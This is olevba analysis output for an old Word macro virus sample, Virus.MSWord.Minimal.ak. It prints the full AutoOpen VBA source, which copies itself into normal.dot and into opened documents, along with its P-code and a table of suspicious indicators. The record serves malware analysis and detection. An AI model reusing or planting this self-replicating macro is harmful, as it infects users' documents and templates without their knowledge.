olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ak
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ak - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.ak - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The SMALLEST Macro-virus in history  ;)
'(c) Master of infection
'Queen Hitman Virus inc.
Public Sub MAIN()
Dim nn$
Dim n0$
Dim n1$
Dim n2$
n0$ = ":AutoOpen"
nn$ = WordBasic.[DefaultDir$](2) + "/normal.dot"
n1$ = WordBasic.[FileName$]() + n0$
n2$ = nn$ + n0$
On Error GoTo -1: On Error GoTo cont
WordBasic.MacroCopy n1$, n2$
GoTo okey
cont:
WordBasic.MacroCopy n2$, n1$
On Error GoTo zt
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
dlg.Format = 1
WordBasic.FileSaveAs dlg
GoTo okey
zt:
WordBasic.MsgBox "ERROR!", 16
okey:
WordBasic.MsgBox "OK!", 64
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.ak
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AutoOpen - 2175 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0027 "The SMALLEST Macro-virus in history  ;)"
' Line #1:
' 	QuoteRem 0x0000 0x0017 "(c) Master of infection"
' Line #2:
' 	QuoteRem 0x0000 0x0017 "Queen Hitman Virus inc."
' Line #3:
' 	FuncDefn (Public Sub MAIN())
' Line #4:
' 	Dim 
' 	VarDefn nn
' Line #5:
' 	Dim 
' 	VarDefn n0
' Line #6:
' 	Dim 
' 	VarDefn n1
' Line #7:
' 	Dim 
' 	VarDefn n2
' Line #8:
' 	LitStr 0x0009 ":AutoOpen"
' 	St n0$ 
' Line #9:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "/normal.dot"
' 	Add 
' 	St nn$ 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld n0$ 
' 	Add 
' 	St n1$ 
' Line #11:
' 	Ld nn$ 
' 	Ld n0$ 
' 	Add 
' 	St n2$ 
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError cont 
' Line #13:
' 	Ld n1$ 
' 	Ld n2$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	GoTo okey 
' Line #15:
' 	Label cont 
' Line #16:
' 	Ld n2$ 
' 	Ld n1$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	OnError zt 
' Line #18:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #19:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #21:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #22:
' 	GoTo okey 
' Line #23:
' 	Label zt 
' Line #24:
' 	LitStr 0x0006 "ERROR!"
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #25:
' 	Label okey 
' Line #26:
' 	LitStr 0x0003 "OK!"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #27:
' 	EndSub 
' Line #28:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

